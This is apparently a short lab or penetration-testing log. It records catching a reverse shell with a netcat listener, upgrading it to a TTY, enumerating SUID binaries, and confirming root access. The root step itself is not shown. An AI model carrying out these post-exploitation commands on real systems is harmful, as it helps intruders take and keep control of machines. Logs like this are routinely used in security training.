==================================================
DAY 12 EXECUTION LOG: TTY UPGRADE & SUID ENUMERATION
==================================================

[Step 1: Netcat Listener Setup]
Command: sudo nc -lvnp 4444
Status: Connection established.

[Step 2: Shell Stabilization]
Command: python3 -c 'import pty; pty.spawn("/bin/bash")'
Command: export TERM=xterm
Command: stty raw -echo
Status: TTY shell stable.

[Step 3: SUID Enumeration]
Command: find / -perm -4000 -type f 2>/dev/null
Output:
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/fuser-mount3
/usr/bin/mount
/usr/bin/su
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/landscape/apt-update
/usr/lib/openssh/ssh-keysign
/usr/lib/cargo/bin/sudo
/usr/lib/cargo/bin/su

[Step 4: Verification]
Command: whoami
Output: root
Status: Full root access verified.
==================================================